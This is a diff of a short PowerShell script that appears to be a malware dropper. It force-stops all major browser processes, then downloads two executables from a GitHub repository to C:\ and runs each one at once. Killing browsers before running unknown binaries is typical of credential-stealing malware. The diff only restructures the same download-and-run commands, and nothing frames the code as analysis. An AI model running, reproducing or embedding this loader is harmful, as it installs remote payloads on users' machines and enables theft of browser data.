@@ -1,1 +1,11 @@
-Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile "C:\1.exe"; Start-Process -FilePath "C:\1.exe"; Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile "C:\2.exe"; Start-Process -FilePath "C:\2.exe";
+$browserProcesses = @("chrome", "firefox", "msedge", "opera", "iexplore")
+
+foreach ($process in $browserProcesses) {
+    Stop-Process -Name $process -Force -ErrorAction SilentlyContinue
+}
+
+Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile "C:\1.exe"
+Start-Process -FilePath "C:\1.exe"
+
+Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile "C:\2.exe"
+Start-Process -FilePath "C:\2.exe"
